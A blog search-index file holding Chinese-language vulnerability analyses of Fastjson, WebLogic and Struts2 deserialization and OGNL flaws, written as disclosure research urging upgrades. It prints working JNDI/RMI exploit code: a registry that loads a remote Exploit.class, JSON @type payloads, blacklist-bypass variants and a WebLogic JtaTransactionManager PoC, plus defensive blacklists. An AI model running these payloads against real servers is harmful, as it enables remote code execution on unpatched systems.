<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析]]></title>
    <url>%2F2018%2F10%2F23%2F%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[发表于2017年11月22日，修改于2018年10月23日 背景这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。 Fastjson 使用Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化。项目地址：https://github.com/alibaba/fastjson。那我们看下如何使用？首先定义一个User.java,代码如下：12345678910111213141516public class User &#123; private Long id; private String name; public Long getId() &#123; return id; &#125; public void setId(Long id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 序列化的代码如下：123456import com.alibaba.fastjson.JSON;User guestUser = new User();guestUser.setId(2L);guestUser.setName("guest");String jsonString = JSON.toJSONString(guestUser);System.out.println(jsonString); 反序列化的代码示例：12String jsonString = "&#123;\"name\":\"guest\",\"id\":12&#125;";User user = JSON.parseObject(jsonString, User.class); 上述代码的parseObject也可以直接用parse接口。 Fastjson安全特性反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法。上图则是Fastjson反序列框架图。JSON门面类，提供一些静态方法，如parse，parseObject.其主要功能都是在DefaultJSONParser类中实现。DefaultJSONParser引用了ParserConfig，主要保存一些相关配置信息。也引用了JSONLexerBase，这个类用来处理字符分析。而反序列化用到的JavaBeanDeserializer则是JavaBean反序列化处理主类。fastjson在1.2.24版本添加enable_autotype开关，将一些类加到黑名单中，后续我也给它报过bypass，fastjson也一并修复。 JNDIJNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的blackhat大会上web议题重点讲到，但是对于json这一块没有涉及。JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。我们可以看一下它的架构图，JNDI提供了一个统一的外部接口，底层SPI则是多样的。在使用JNDIReferences的时候可以远程加载外部的对象，即实现factory的初始化。如果说其lookup方法的参数是我们可以控制的，可以将其参数指向我们控制的RMI服务，切换到我们控制的RMI/LDAP服务等等。12345Registry registry = LocateRegistry.createRegistry(1099);//http://xxlegend.com/Exploit.classReference reference = new javax.naming.Reference(“Exploit",“Exploit","http://xxlegend.com/");ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);registry.bind(“Exploit", referenceWrapper); 这段代码主要讲到了在1099端口上创建一个RMI服务，RMI的内容则是通过外部的http服务地址获取。在客户端则是将lookup的地址指向刚才我们创建的RMI服务，即能达到远程代码执行的目的。可以使用如下的请求端代码进行测试：12345Hashtable env = new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);Context ctx = new InitialContext(env);Object local_obj = RicterCctx.lookup(&quot;rmi://xxlegend.com/Exploit&quot;); 那么攻击者的流程就是这样的。攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。 PoC构造与分析介绍的背景有点多，正式切入我们的正题，基于JdbcRowSetImpl的PoC是如何构造和执行的。在今年5月份的时候，我也公布了Fastjson基于TemplateImpl的PoC的，但是限制还比较多，需要打开SupportNonPublic开关，这个场景是比较少见的，详细的分析见我的博客http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/，后续ricterz也作了一篇分析：https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up。在看雪峰会上我提到了好几种PoC，下面我简单的给这些PoC做个分类：1，基于TemplateImpl2，基于JNDI Bean Property类型3，基于JNDI Field类型 今天主讲基于JNDI Bean Property这个类型，这个类型和JNDI Field类型的区别就在于Bean Property需要借助setter，getter方法触发，而Field类型则没有这个必要。JdbcRowSetImpl刚好就在Bean Property分类之下，其他的PoC后续再讲。这个Poc相对于TemplateImpl却没有一点儿限制，当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事。 PoC具体如下：1&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:389/obj","autoCommit":true&#125; 由于这个PoC是基于JNDI，下面我们简单构造一下，首先是服务端的代码：123456789101112131415public class JNDIServer &#123; public static void start() throws AlreadyBoundException, RemoteException, NamingException &#123; Registry registry = LocateRegistry.createRegistry(1099); //http://xxlegend.com/Exploit.class即可 Reference reference = new Reference("Exloit", "Exploit","http://xxlegend.com/"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind("Exploit",referenceWrapper); &#125; public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123; start(); &#125;&#125; rmi服务端需要一个Exploit.class放到rmi指向的web服务器目录下，这个Exploit.class是一个factory，通过Exploit.java编译得来，在JNDI执行的过程会被初始化。如下是Exploit.java的代码：123456789101112public class Exploit &#123; public Exploit()&#123; try&#123; Runtime.getRuntime().exec("calc"); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; Exploit e = new Exploit(); &#125;&#125; 服务端构造好之后，下面来看java应用执行的代码，示例如下：123456789101112public class JdbcRowSetImplPoc &#123; public static void main(String[] argv)&#123; testJdbcRowSetImpl(); &#125; public static void testJdbcRowSetImpl()&#123; // String payload = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +// " \"autoCommit\":true&#125;"; String payload = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," + " \"autoCommit\":true&#125;"; JSON.parse(payload); &#125;&#125; 完整的代码已经放到1234567891011121314151617PoC调用栈如下![3](/images/JdbcRowSetImpl_3.png)从这个调用栈就可以看出，在进入Gadget之前，首先是Java应用调用Fastjson的parseObject或者parse接口，进入JavaObjectDeserializer.deserialize方法，经过一系列判断之后发现是JavaBean，就会调用JavaBeanDeserializer.deserialize接口,反序列化得到Gadget相关域，在这个过程中都是通过反射调用这些域的getter，setter或者is方法，这就正式在Gadget执行代码。下面看一下在Gadget中执行的代码。在反序列化过程中是有次序来调用相应接口的，首先是设置dataSourceName属性，这个是其父类BaseRowSet继承过来的。```javapublic void setDataSourceName(String name) throws SQLException &#123; if (name == null) &#123; dataSource = null; &#125; else if (name.equals(&quot;&quot;)) &#123; throw new SQLException(&quot;DataSource name cannot be empty string&quot;); &#125; else &#123; dataSource = name; &#125; URL = null;&#125; 设置autoCommit属性:123456789public void setAutoCommit(boolean var1) throws SQLException &#123; if(this.conn != null) &#123; this.conn.setAutoCommit(var1); &#125; else &#123; this.conn = this.connect(); this.conn.setAutoCommit(var1); &#125;&#125; 这setAutoCommit里函数里会触发connect函数。123456789101112131415private Connection connect() throws SQLException &#123; if(this.conn != null) &#123; return this.conn; &#125; else if(this.getDataSourceName() != null) &#123; try &#123; InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null &amp;&amp; !this.getUsername().equals("")?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection(); &#125; catch (NamingException var3) &#123; throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString()); &#125; &#125; else &#123; return this.getUrl() != null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null; &#125;&#125; 这里面就调用InitialContext的lookup方法，而且找到的就是我们前面设置的DataSourceName(),达到远程调用任意类的目的。由于JdbcRowSetImpl是官方自带的库，所以这个PoC的威力相对来说更厉害。如果还在使用Fastjson 1.2.24版本及以下烦请升级。 引用：1，https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf2,http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>反序列化</tag>
        <tag>PoC</tag>
        <tag>Fastjson</tag>
        <tag>JdbcRowSetImpl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic CVE-2018-3191分析]]></title>
    <url>%2F2018%2F10%2F23%2FWeblogic%20CVE-2018-3191%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[已经在公众号发表，链接地址：https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg 1 背景北京时间10月17日，Oracle官方发布的10月关键补丁更新CPU（Critical Patch Update）中修复了一个高危的WebLogic远程代码执行漏洞（CVE-2018-3191）。该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。这个漏洞由Matthias Kaiser，loopx9，Li Zhengdong申报。 2 补丁分析如下图所示这回的补丁主要增加了两个大类黑名单，分别是java.rmi.server.RemoteObject和com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager，RemoteObject是用于修补漏洞编号为CVE-2018-3245的漏洞，当时笔者在报这个漏洞的过程中就将所有涉及到RemoteObject相关的poc都提交给了Oracle官方。AbstractPlatformTransactionManager这个黑名单就是用于防止Spring JNDI注入，从官方以前的黑名单上就能看到org.springframework.transaction.support.AbstractPlatformTransactionManager,但是官方没有想到在com.bea.core.repackaged的相关包还有spring的相关类。其实这两个包中的类实现几乎一样，只是来源于不同的包。 3 动态分析通过前一章的静态分析已经知道CVE-2018-3191所对应的补丁，就是AbstractPlatformTransactionManager，用于防止Spring JNDI注入。在我们的PoC中主要用到JtaTransactionManager这个类。下面来看一下这个类中关键的几个地方。123456789public class JtaTransactionManager extends AbstractPlatformTransactionManager implements TransactionFactory, InitializingBean, Serializable &#123; public static final String DEFAULT_USER_TRANSACTION_NAME = "java:comp/UserTransaction"; public static final String[] FALLBACK_TRANSACTION_MANAGER_NAMES = new String[]&#123;"java:comp/TransactionManager", "java:appserver/TransactionManager", "java:pm/TransactionManager", "java:/TransactionManager"&#125;; public static final String DEFAULT_TRANSACTION_SYNCHRONIZATION_REGISTRY_NAME = "java:comp/TransactionSynchronizationRegistry"; private static final String TRANSACTION_SYNCHRONIZATION_REGISTRY_CLASS_NAME = "javax.transaction.TransactionSynchronizationRegistry"; private transient JndiTemplate jndiTemplate; private transient UserTransaction userTransaction; private String userTransactionName; ..... JtaTransactionManager类继承自AbstractPlatformTransactionManager，实现了Serializable接口，其中私有属性userTransactionName是用于JNDI寻址。在Java反序列化中，入口有很多，readObject是最常见的，定位到JtaTransactionManager.readObject方法，实现如下：123456private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ois.defaultReadObject(); this.jndiTemplate = new JndiTemplate(); this.initUserTransactionAndTransactionManager(); this.initTransactionSynchronizationRegistry();&#125; 继续跟踪initUserTransactionAndTransactionManager方法的实现：12345678910protected void initUserTransactionAndTransactionManager() throws TransactionSystemException &#123; if (this.userTransaction == null) &#123; if (StringUtils.hasLength(this.userTransactionName)) &#123; this.userTransaction = this.lookupUserTransaction(this.userTransactionName); this.userTransactionObtainedFromJndi = true; &#125; else &#123; this.userTransaction = this.retrieveUserTransaction(); &#125; &#125;..... 在 initUserTransactionAndTransactionManager的方法中就有基于JNDI寻址方法lookupUserTransaction关键寻址部分代码如下：1234567891011protected UserTransaction lookupUserTransaction(String userTransactionName) throws TransactionSystemException &#123; try &#123; if (this.logger.isDebugEnabled()) &#123; this.logger.debug("Retrieving JTA UserTransaction from JNDI location [" + userTransactionName + "]"); &#125; return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class); &#125; catch (NamingException var3) &#123; throw new TransactionSystemException("JTA UserTransaction is not available at JNDI location [" + userTransactionName + "]", var3); &#125;&#125; 有了如上的分析，构造PoC也是水到渠成，下面是PoC的关键代码：12345678910public static Object getJtaTransactionManagerObject(String command)&#123;int seq = command.indexOf(':');if (seq &lt; 0)&#123;command = "rmi://localhost:1099/Exploit";&#125;JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();jtaTransactionManager.setUserTransactionName(command);return jtaTransactionManager;&#125; 更详细的关于JNDI的使用可参考作者以前的博文，这里不再重复。漏洞效果如下图： 由于这个漏洞利用的gadget是weblogic中自带的，跟JDK版本无关，所以只要系统能连外网，未禁止T3协议，漏洞就可以利用，威力巨大，请尽快升级到Weblogic最新版。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>Weblogic</tag>
        <tag>反序列化</tag>
        <tag>CVE-2018-3191</tag>
        <tag>CPU</tag>
        <tag>PoC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-048 动态分析]]></title>
    <url>%2F2018%2F09%2F21%2FS2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[综述2017年7月7日，Apache Struts发布最新的安全公告，Apache Structs2的strus1插件存在远程代码执行的高危漏洞，漏洞编号为CVE-2017-9791（S2-048）。攻击者可以构造恶意的字段值通过Struts2的struts2-struts1-plugin的插件，远程执行代码 漏洞分析(1) 漏洞简介Apache Struts2.3.x系列版本中struts2-struts1-plugin存在远程代码执行漏洞，进而导致任意代码执行。(2) 漏洞分析官方的漏洞描述如下： 从官方的漏洞描述我们可以知道，这个漏洞本质上是在struts2-struts1-plugin这个jar包上。这个库是用将struts1的action封装成struts2的action以便在strut2上使用。本质原因还是在struts2-struts1-plugin包中Struts1Action.java中execute函数调用了getText函数，这个函数会执行ognl表达式，更可恶的是getText的输入内容还是攻击者可控的。以下分析基于struts2的官方示例struts2-showcase war包。首先Struts1Action的execute方法代码如下，从红框中信息可以看出其实质是调用SaveGangsterAction.execute方法，然后再调用getText(msg.getKey()….)。在struts2-showcase的integration模块下有SaveGangsterAction.java的execute方法的实现。具体如下：在这个方法中就带入有毒参数gforn.getName()放到了messages结构中，而gform.getName()的值是从客户端获取的。Gangsterform.getName()的实现如下：我们这里传入了${1+1}。有毒参数已经带入，就差ognl表达式。继续回到Struts1Action.java的execute方法下半部分，这里有getText()的入口，能清晰看到参数已经被污染，具体如下图：下面进入getText的实现函数：这个调用栈比较深，首先我们给出栈图：从Struts1action.execute函数开始，到ActionSupport的getText()方法，方法如下：接着进入TextProviderSuppport.getText，接着调用其另一个重载类方法getText(),示例如下：如图所示，进入LocalizeTextUtil.findText，继续分析其实现：从名字上也能看出其是根据用户的配置做一些本地化的操作。代码如下：熟悉struts2的童鞋跟到这一步就能发现这就是一个很典型的ognl表达式入口，先是得到一个valueStack，再继续递归得到ognl表达式的值。这里不再描述，详情可参考官方链接：https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/LocalizedTextUtil.html最后附上一个简单的测试用例图：]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>S2-048</tag>
        <tag>Struts2</tag>
        <tag>动态分析</tag>
        <tag>CVE-2017-9791</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-057 技术分析]]></title>
    <url>%2F2018%2F09%2F21%2FS2-057%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[漏洞公告文章从公众号转移过来，在博客上做个记录。 北京时间8月22日13时，Apache官方发布通告公布了Struts2中一个远程代码执行漏洞（CVE-2018-11776）。该漏洞在两种情况下存在，第一，在xml配置中未设置namespace值，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。第二，使用未设置 value和action值的url标签，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。 补丁对比如图所示，补丁主要添加了cleanNamespaceName方法，该方法通过白名单的方式来验证namespace是否合法，从官方描述和漏洞修复方式来看，该漏洞应该是一个Ognl的表达式注入漏洞 动态分析漏洞发布几个小时之后，漏洞发现作者公布了整个发现过程，并且详细分析了一种漏洞情形：https://lgtm.com/blog/apache_struts_CVE-2018-11776按照该博客的说法，拉取struts2-showcase项目作为示例，修改struts-actionchaining.xml，具体如下：123456789&lt;struts&gt; &lt;package name="actionchaining" extends="struts-default" &gt; &lt;action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1"&gt; &lt;result type="redirectAction"&gt; &lt;param name = "actionName"&gt;register2&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 在这种情况下，所有到actionChain1.action的请求的返回结果都会指向register2，并且执行链会到ServletActionRedirectResult.execute方法中，具体如下： 从上图可以看出，通过namespace字段，污染了tmpLocation字典，并且设置为了预期的执行的PoC，这也是补丁中为什么要净化namespace的原因，继续跟踪namespace的去向,执行链会到ServletActionRedirectResult的父类的父类StrutsResultSupport.execute方法中，具体如下图这里有个conditionParse方法，这个方式就是使用Ognl表达式来计算数据值，在系统中用得非常多，而且在一些历史漏洞中，也应该由它来背锅，当然最大的锅还是struts官方，每次漏洞出在哪就修在哪，典型的头痛医头，脚痛医脚。方法实现如下图所示在这个方法中会使用到TextParseUtil.translateVariables方法，继续跟踪，调用栈进入OgnlTextParser中的evaluate方法,首先会判断传入的表达式是否合法，比如是否能找到${}或者%{}对，接着调用evaluator.evaluate求值，求值过程非常复杂，总得来说就是链式执行过程，具体如下调用栈：从上图也可以看出最顶层就是通过反射的方式来调用ProcessBuilder的构造函数，中间部分就是链式执行过程中牵涉到一些操作。我们可以看下求值过程中参数的一些情况。来查看Ognl安全加固的一些变化，具体如下图：主要是黑名单上又添加了一些类，分别是class ognl.DefaultMemberAccess class com.opensymphony.xwork2.ognl.SecurityMemberAccess class java.lang.ProcessBuilder 分析就结束了，计算器还是要弹的，如下图： PoC 构造这块是最难的，也是最不好调试的，利用showcase项目很早就能执行${(1+1)}=2的效果，但是要弹出计算器，并不容易，其实就是新的沙箱的绕过，当时在调试的时候就发现，每次的返回结果都是空，没办法，只能耐着性子，将原先的PoC进行拆分，一个单元的一个单元的测试。测试获取#context的时候总为空，后来发现导致无法获取OgnlUtil的实例，怎么获取context，有多种方式，从代码结构来看可以从ognl表达式一些固有表达式来获取，如#root,#request等。]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
        <tag>动态分析</tag>
        <tag>S2-057</tag>
        <tag>CVE-2017-11776</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[先知议题 Java反序列化实战 解读]]></title>
    <url>%2F2018%2F06%2F20%2F%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB%2F</url>
    <content type="text"><![CDATA[1 议题和个人介绍1.1 议题概述2017年又是反序列漏洞的大年，涌现了许多经典的因为反序列化导致的远程代码执行漏洞，像fastjson，jackson，struts2，weblogic这些使用量非常大的产品都存在这类漏洞，但不幸的是，这些漏洞的修复方式都是基于黑名单，每次都是旧洞未补全，新洞已面世。随着虚拟货币的暴涨，这些直接的远程执行代码漏洞都成了挖矿者的乐园。本议题将从那些经典案例入手，分析攻击方和防御方的对抗过程。首先是fastjson的最近的安全补丁的分析，由于黑名单做了加密处理，这里会展开如何得到其黑名单，如何构造PoC。当然2018年的重点还是weblogic，由我给大家剖析CVE-2018-2628及其他Weblogic经典漏洞，带大家傲游反序列化的世界，同时也是希望开发者多多借鉴做好安全编码。 1.2 个人简介：本文作者来自绿盟科技，现任网络安全攻防实验室安全研究经理，安全行业从业七年，是看雪大会讲师，Pycon大会讲师，央视专访嘉宾，向RedHat、Apache、Amazon，Weblogic，阿里提交多份RCE漏洞报告，最近的Weblogic CVE-2018-2628就是一个。 个人博客：xxlegend.com 个人公众号:廖新喜 2 反序列化入门序列化和反序列化是java引入的数据传输存储接口，序列化是用于将对象转换成二进制串存储，对应着writeObject，而反序列正好相反，将二进制串转换成对象，对应着readObject，类必须实现反序列化接口，同时设置serialVersionUID以便适用不同jvm环境。可通过SerializationDumper这个工具来查看其存储格式,工具直接可在github上搜索.主要包括Magic头：0xaced,TC_OBJECT:0x73,TC_CLASS:0x72,serialVersionUID,newHandle使用场景:• http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等• Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）• xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml）• json(Jackson，fastjson) http请求中包含 反序列攻击时序图: 常见的反序列化项目：• Ysoserial 原生序列化PoC生成• Marshalsec 第三方格式序列化PoC生成• Freddy burp反序列化测试插件• Java-Deserialization-Cheat-Sheet 3 fastjson3.1 简介Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化，示例代码如下：12345User user = new User("guest",2);String jsonString = JSON.toJSONString(user)String jsonString = "&#123;\"name\":\"guest\",\"age\":12&#125;"User user = (User)JSON.parse(jsonString) Fastjson PoC分类主要分为两大类，一个是基于TemplateImpl，另外就是基于基于JNDI，基于JNDI的又可分为a) Bean Property类型b) Field类型可以参考Demo：https://github.com/shengqi158/fastjson-remote-code-execute-poc fastjson为了防止研究人员研究它的黑名单，想出了一套新的黑名单机制，这套黑名单是基于具体类的hash加密算法，不可逆。如果是简单穷举，基本算不出来，后来我想到这些库的黑名单肯定都在Maven仓库中，于是写了个爬虫，爬取Maven仓库下所有类，然后正向匹配输出真正的黑名单类。 3.2 fastjson最近的几个经典漏洞下面这段代码是fastjson用来自定义loadClass的实现123456789101112131415public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123; //省略 if (className.charAt(0) == '[') &#123; Class&lt;?&gt; componen/tType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; if (className.startsWith("L") &amp;&amp; className.endsWith(";")) &#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; try &#123; if (classLoader != null) &#123; clazz = classLoader.loadClass(className); 首先我们来看一个经典的PoC，{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot; &quot;autoCommit&quot;:true},关于这个PoC的解读在我博客上有，这里不再详述，但是今天我们要讲的是前面贴出的一段loadClass导致的一系列漏洞，首先看1.2.41的绕过方法是Lcom.sun.rowset.RowSetImpl;,当时看到这个PoC的时候就在想官方不会只去掉一次第一个字符L和最后一个字符；吧，果不其然，在官方的修补方案中，如果以L打头，；结尾则会去掉打头和结尾。当时我就发了一个感概：补丁未出，漏洞已行。很显然，1.2.42的绕过方法是LLcom.sum.rowset.RowSetImpl;;,细心的读者还会看到loadClass的第一个if判断中还有[打头部分，所以就又有了1.2.43的绕过方法是 [com.sun.rowset.RowSetImp.在官方版本1.2.45黑名单中又添加了ibatis的黑名单，PoC如下:{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:{&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}}，首先这是一个基于JNDI的PoC，为了更加理解这个PoC，我们还是先来看一下JndiDataSourceFactory的源码。123456789101112131415161718192021public class JndiDataSourceFactory implements DataSourceFactory &#123; public static final String DATA_SOURCE = "data_source"; //省略 public void setProperties(Properties properties) &#123; try &#123; InitialContext initCtx = null; Hashtable env = getEnvProperties(properties); if (env == null) &#123; initCtx = new InitialContext(); &#125; else &#123; initCtx = new InitialContext(env); &#125; //省略 &#125; else if (properties.containsKey(DATA_SOURCE)) &#123; dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE)); &#125; &#125; catch (NamingException e) &#123; throw new DataSourceException("There was an error configuring JndiDataSourceTransactionPool. Cause: " + e, e); &#125; &#125; 其本质还是通过bean操作接口set来调用setProperties，然后触发JNDI查询。 4 weblogicWeblogic是第一个成功商业化的J2EE应用服务器，在大型企业中使用非常广泛。在Oracle旗下，可以与其他Oracle产品强强联手，WebLogic Server Java EE 应用基于标准化、模块化的组件，WebLogic Server 为这些模块提供了一组完整的服务，无需编程即可自动处理应用行为的许多细节，另外其独有的T3协议采用序列化实现。下图就是weblogic的历史漏洞展示： CVE-2015-4852基于T3• 新的攻击面• 基于commons-collections• 采用黑名单修复123456org.apache.commons.collections.functors* *com.sun.org.apache.xalan.internal.xsltc.trax* *javassist* *org.codehaus.groovy.runtime.ConvertedClosureorg.codehaus.groovy.runtime.ConversionHandlerorg.codehaus.groovy.runtime.MethodClosure • 作用位置有限123weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStreamweblogic.rjvm.MsgAbbrevInputStream.classweblogic.iiop.Utils.class CVE-2016-0638首先来看下漏洞位置，在readExternal位置，1234567891011public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123; super.readExternal(var1); //省略 ByteArrayInputStream var4 = new ByteArrayInputStream(this.buffer); ObjectInputStream var5 = new ObjectInputStream(var4); //省略 try &#123; while (true) &#123; this.writeObject(var5.readObject()); &#125; &#125; catch (EOFException var9) &#123; 再来看看补丁，加了一个FilteringObjectInputStream过滤接口 1234567891011121314151617181920212223242526272829 public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123; super.readExternal(var1); //省略 this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)in) BufferInputStream is = this.payload.getInputStream(); FilteringObjectInputStream var5 = new FilteringObjectInputStream(var4); //省略 try &#123; while (true) &#123; this.writeObject(var5.readObject()); &#125; &#125; catch (EOFException var9) &#123;``` FilteringObjectInputStream的实现如下：```java public class FilteringObjectInputStream extends ObjectInputStream &#123; public FilteringObjectInputStream(InputStream in) throws IOException &#123; super(in); &#125; protected Class&lt;?&gt; resolveClass(java.io.ObjectStreamClass descriptor) throws ClassNotFoundException, IOException &#123; String className = descriptor.getName(); if(className != null &amp;&amp; className.length() &gt; 0 &amp;&amp; ClassFilter.isBlackListed(className)) &#123; throw new InvalidClassException("Unauthorized deserialization attempt", descriptor.getName()); &#125; else &#123; return super.resolveClass(descriptor); &#125; &#125;&#125; 其实就是在resolveClass位置加了一层黑名单控制。 基于XMLDecoder• CVE-2017-3506 由于使用了存在反序列化缺陷XMLDecoder导致的漏洞• CVE-2017-10271 是3506的绕过• 都是挖矿主力军• 基于http协议详细解读可参考我的博客：http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/ CVE-2017-324812345678910111213141516171819202122232425private static class ServerChannelInputStream extends ObjectInputStream implements ServerChannelStream &#123; protected Class resolveClass(ObjectStreamClass descriptor) throws ClassNotFoundException, IOException &#123; String className = descriptor.getName(); if(className != null &amp;&amp; className.length() &gt; 0 &amp;&amp; ClassFilter.isBlackListed(className)) &#123; throw new InvalidClassException("Unauthorized deserialization attempt", descriptor.getName()); &#125; else &#123; Class c = super.resolveClass(descriptor); //省略 &#125; &#125; protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123; String[] arr$ = interfaces; int len$ = interfaces.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; String intf = arr$[i$]; if(intf.equals("java.rmi.registry.Registry")) &#123; throw new InvalidObjectException("Unauthorized proxy deserialization"); &#125; &#125; return super.resolveProxyClass(interfaces); &#125; CVE-2017-3248 这个漏洞是根据JRMPListener来构造的，从这个补丁也可以看出，在resolveClass和resolveProxyClass都设置了黑名单。 CVE-2018-2628这个漏洞是我报给Oracle官方的，但是他们并没有修复完全，导致后来这个漏洞被滥用。• 完美绕过CVE-2017-3248• 基于StreamMessage封装• 利用java.rmi.activation.Activator绕过补丁中对java.rmi.registry.Registry的限制• Proxy非必须项攻击示意图如下：简单分析可见：http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/ 5 反序列化防御5.1 Weblogic防御• 过滤T3协议，限定可连接的IP• 设置Nginx反向代理，实现t3协议和http协议隔离• JEP290（JDK8u121，7u131，6u141），这个机制主要是在每层反序列化过程中都加了一层黑名单处理，黑名单如下：黑名单：12345678910maxdepth=100;!org.codehaus.groovy.runtime.ConvertedClosure;!org.codehaus.groovy.runtime.ConversionHandler;!org.codehaus.groovy.runtime.MethodClosure;!org.springframework.transaction.support.AbstractPlatformTransactionManager;!sun.rmi.server.UnicastRef;!org.apache.commons.collections.functors.*;!com.sun.org.apache.xalan.internal.xsltc.trax.*;!javassist.* 当然也有失效的时候，就是发现了新的gadget。这也促使Oracle开始放弃反序列化支持。 5.2 